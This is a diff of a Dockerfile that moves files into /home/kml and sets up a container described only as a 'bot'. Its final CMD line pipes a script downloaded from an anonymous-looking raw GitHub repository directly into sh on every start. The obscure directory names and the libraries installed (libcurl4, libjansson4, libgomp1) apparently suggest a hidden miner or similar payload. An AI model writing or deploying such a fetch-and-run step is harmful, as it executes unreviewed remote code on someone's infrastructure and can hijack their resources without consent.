@@ -21,20 +21,20 @@ RUN apt-get update && apt-get install -y \
     libcurl4 \
     libjansson4 \
     libgomp1 \
- && mkdir -p /mxl/ijk
+ && mkdir -p /home/kml
 
 # Set work dir:
-WORKDIR /mxl
+WORKDIR /home
 
 # Copy files:
-COPY startbot.sh /mxl
-COPY /mxl /mxl/ijk
+COPY startbot.sh /home
+COPY /kml /home/kml
 
 # Run config.sh and clean up APT:
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN echo "Uploaded files:" && ls /mxl/ijk/
+RUN echo "Uploaded files:" && ls /home/kml/
 
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/55113110159/java/master/mxl.sh | sh 
